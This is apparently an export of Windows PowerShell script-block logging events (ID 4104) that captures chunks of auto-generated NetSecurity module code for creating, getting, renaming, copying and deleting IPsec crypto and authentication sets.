        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Description')) {
          [object]$__cmdletization_value = ${Description}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Group')) {
          [object]$__cmdletization_value = ${Group}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Proposal')) {
          [object]$__cmdletization_value = ${Proposal}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MaxMinutes')) {
          [object]$__cmdletization_value = ${MaxMinutes}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeMinutes'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeMinutes'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MaxSessions')) {
          [object]$__cmdletization_value = ${MaxSessions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeSessions'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeSessions'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ForceDiffieHellman')) {
          [object]$__cmdletization_value = ${ForceDiffieHellman}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceDiffieHellman'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceDiffieHellman'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Default')) {
          [object]$__cmdletization_value = ${Default}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetIPsecMainModeCryptoSet' -Alias '*'
        

function Get-NetIPsecMainModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [Val

ScriptBlock ID: f25ca2f5-ae99-46ae-ade0-bcd1dbfae1dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 4):
.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase2AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetIPsecPhase2AuthSet' -Alias '*'
        

function Copy-NetIPsecPhase2AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewPolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewGPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleEMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewPolicyStore')) {
            [object]$__cmdletization_value = ${NewPolicyStore}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewGPOSession')) {
            [object]$__cmdletization_value = ${NewGPOSession}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('CloneObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase2AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Copy-NetIPsecPhase2AuthSet' -Alias '*'
        


ScriptBlock ID: eae1be9a-bbc7-4657-8997-5e4c7169c46a
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 4):
ssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleEMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
